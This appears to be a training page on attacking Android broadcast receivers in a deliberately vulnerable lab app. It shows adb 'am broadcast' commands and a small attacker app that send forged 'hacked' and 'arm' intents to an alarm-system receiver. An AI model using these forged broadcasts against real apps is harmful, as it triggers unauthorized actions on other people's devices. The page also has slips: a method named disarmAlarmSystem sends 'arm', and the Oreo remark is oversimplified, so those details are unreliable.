# BroadcastReceiver Hacking

#### How to Send a Broadcast Using Activity Manager (am) in Android

In Android, you can send broadcasts to receivers defined in the `AndroidManifest.xml`. Here’s a detailed guide on how to do this effectively.

**Defining Intent Filters in `AndroidManifest.xml`**

First, define your receiver and its intent filters in the `AndroidManifest.xml`. For example:

```xml
<receiver android:name=".MyReceiver">
    <intent-filter>
        <action android:name="com.example.MY_ACTION" />
    </intent-filter>
</receiver>
```

In our example application, the receiver is configured to listen for two actions: `BOOT_COMPLETED` and `LOCKED_BOOT_COMPLETED`.

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Sending a Broadcast Using `adb`**

To send a broadcast to this receiver using `adb shell`, you can utilize the `am` (Activity Manager) command. Here’s how to send a `BOOT_COMPLETED` broadcast:

```sh
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED
```

After executing this command, you should observe in logcat that the application is handling the broadcast, possibly performing a system reset.

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

**Compatibility with Newer Android Versions**

The above method works for older versions of Android. For Android 8.0 (Oreo) and higher, broadcast receivers need to be registered in the Java code, not just in the manifest.

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

**Checking the `onReceive` Method**

Let’s examine the `onReceive` method in your BroadcastReceiver. Typically, it might process extras included in the broadcast intent. For example, it could be looking for an extra with the key `status`:

```java
@Override
public void onReceive(Context context, Intent intent) {
    String status = intent.getStringExtra("status");
    if ("hacked".equals(status)) {
        // Handle the "hacked" status
    } else if ("arm".equals(status)) {
        // Handle the "arm" status
    }
}
```

**Here is what we got in our vuln-app**

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

**Sending a Custom Broadcast**

To test your receiver by sending a custom broadcast with an extra value, use the `am` command. For instance, to send a status of "hacked", execute:

```sh
adb shell am broadcast -a com.apphacking.broadcastreceiver.alarmState -es "status" "hacked"
```

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

You should see logcat messages indicating that the application has processed the "hacked" status.

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

**Arming the Alarm System**

Similarly, to arm the alarm system, you can send a broadcast with the status set to "arm":

```sh
adb shell am broadcast -a com.apphacking.broadcastreceiver.alarmState -es "status" "arm"
```

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

By following these steps, you can effectively send broadcasts using the Activity Manager in Android, whether you are working with older versions or the latest ones.

<figure><img src="../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

### SO our Hacking App's **`MainActivity.java`** code&#x20;

```java
package com.apphacking.broadcasthacking;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;


public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }


    public void disarmAlarmSystem(View view) {

        Intent intent = new Intent();
        intent.setAction("com.apphacking.broadcastreceiver.alarmState");
        intent.putExtra("status","arm");
        sendBroadcast(intent);
    }


}
```
